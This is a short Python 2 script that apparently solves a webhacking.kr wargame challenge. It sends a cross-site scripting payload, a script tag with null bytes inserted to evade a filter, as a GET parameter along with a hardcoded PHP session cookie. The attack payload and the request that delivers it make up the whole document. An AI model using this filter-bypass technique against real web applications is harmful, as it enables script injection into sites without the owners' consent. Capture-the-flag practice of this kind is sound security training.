import requests

url = "http://webhacking.kr/challenge/bonus/bonus-3/index.php"
#a="<s\x00c\x00r\x00i\x00p\x00t>a\x00l\x00e\x00r\x00t(1);</s\x00c\x00r\x00i\x00p\x00t>"

#a = "<s\x00c\x00r\x00i\x00p\x00t>a\x00l\x00e\x00r\x00t(1);</s\x00c\x00r\x00i\x00p\x00t>"


b ="a\x00a"
print b 


params = {
"code":"<s\x00c\x00r\x00i\x00p\x00t>a\x00l\x00e\x00r\x00t(1);</s\x00c\x00r\x00i\x00p\x00t>"
}

headers = {
"Cookie":"PHPSESSID=ce7d7b3317819f9f01951a6263279e37"
}

req  = requests.get(url, params=params, headers=headers)
print req.content
